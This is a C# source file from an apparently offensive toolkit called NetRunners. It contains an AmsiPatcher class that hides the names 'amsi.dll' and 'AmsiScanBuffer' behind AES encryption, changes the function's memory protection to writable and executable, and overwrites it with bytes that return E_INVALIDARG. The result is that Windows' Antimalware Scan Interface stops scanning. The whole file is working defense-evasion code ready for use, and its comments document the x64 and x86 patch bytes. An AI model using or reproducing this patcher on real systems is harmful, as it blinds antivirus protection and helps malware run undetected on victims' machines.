using System;
using System.Runtime.InteropServices;
using static NetRunners.Helpers.Helper;
using static NetRunners.Delegates.Delegate;
using static NetRunners.Decryptors.AesDecryptor;
using static NetRunners.Data.EncryptedData;

namespace NetRunners.Patchers
{
    /// <summary>
    /// Contains AmsiScanBuffer patcher method.
    /// </summary>
    /*
        * x64 patch
        * moves E_INVALIDARG error code to eax, returns
        * 
        mov eax, 0x80070057
        ret

        * x86 patch
        * moves E_INVALIDARG error code to eax, return, pop 18 bytes from stack
        * during my testing, using a ret instruction (c3) instead of c2 0x18 works as well
        * 
        mov eax, 0x80070057
        ret 0x18
    */
    public static class AmsiPatcher
    {
        public static bool Patch()
        {
            try
            {
                byte[] patch;
                IntPtr Library;
                IntPtr funcAddress;
                uint oldProtect;

                // get amsi.dll pointer
                Library = LoadLibraryA(DecryptBytesToStringAes(amsidll_Bytes, AesKey));
                if (Library == IntPtr.Zero)
                    throw new InvalidOperationException($"LoadLibraryA failed with error code: {Marshal.GetLastWin32Error()}");
                // get amsiscanbuffer pointer
                funcAddress = GetProcAddress(Library, DecryptBytesToStringAes(AmsiScanBuffer_Bytes, AesKey));
                if (funcAddress == IntPtr.Zero)
                    throw new InvalidOperationException($"GetProcAddress failed with error code: {Marshal.GetLastWin32Error()}");

                // patch AmsiScanBuffer
                patch = GetAmsiPatch();
                VirtualProtect(funcAddress, (UIntPtr)patch.Length, 0x40, out oldProtect);       // rwx protect
                Marshal.Copy(patch, 0, funcAddress, patch.Length);                              // patch
                VirtualProtect(funcAddress, (UIntPtr)patch.Length, 0x20, out oldProtect);       // restore protect

                Console.WriteLine("[+] Successfully Patched AMSI!");
                
                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine($"An error occurred while patching AMSI: {e.Message}");
                throw;
            }
        }
    }
}